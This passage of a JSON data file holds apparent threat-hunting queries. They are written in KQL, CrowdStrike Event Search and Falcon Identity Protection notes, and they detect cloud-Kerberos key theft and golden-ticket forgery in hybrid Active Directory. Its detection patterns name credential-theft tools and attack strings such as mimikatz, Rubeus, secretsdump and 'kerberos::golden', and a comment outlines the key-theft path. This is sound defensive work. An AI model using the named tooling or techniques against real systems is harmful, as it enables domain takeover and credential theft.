in~ (\"Rubeus.exe\",\"mimikatz.exe\",\"secretsdump.py\")\n| where ProcessCommandLine has_any (\"AzureADKerberos\",\"golden\",\"just-dc-user\",\"aes256\") or FileName in~ (\"Rubeus.exe\",\"mimikatz.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, SHA256\n| order by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"Process execution of cloud-Kerberos key / golden-TGT forgery tooling","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*AzureADKerberosServer*\" OR CommandLine=\"*AzureADHybridAuthenticationManagement*\" OR CommandLine=\"*kerberos::golden*\" OR CommandLine=\"*-just-dc-user*\" OR CommandLine=\"*roadtx*\" OR FileName=\"mimikatz.exe\" OR FileName=\"Rubeus.exe\" OR FileName=\"secretsdump.py\")\n| stats count values(CommandLine) as cmds values(FileName) as files by aid, ComputerName, UserName, ParentBaseFileName\n| sort - count"},{"plat":"Identity Protection","t":"DC Kerberos issuance / AD replication is outside EDR telemetry — cover via Falcon Identity Protection","q":"// Falcon Identity Protection detections: \"Golden Ticket\" and \"DCSync\" / \"Kerberos ticket anomaly\".\n// The AzureADKerberos$ (krbtgt/AzureAD) key theft (AD replication) and forged-TGT issuance occur on the DC and are NOT in Falcon EDR (ProcessRollup2/UserLogon) telemetry.\n// Action: alert on any non-DC principal performing directory replication; correlate the IdP Golden Ticket detection with 4769 lacking a matching Entra WHfB sign-in; pivot the attacker host via the Event Search query above."}]}];
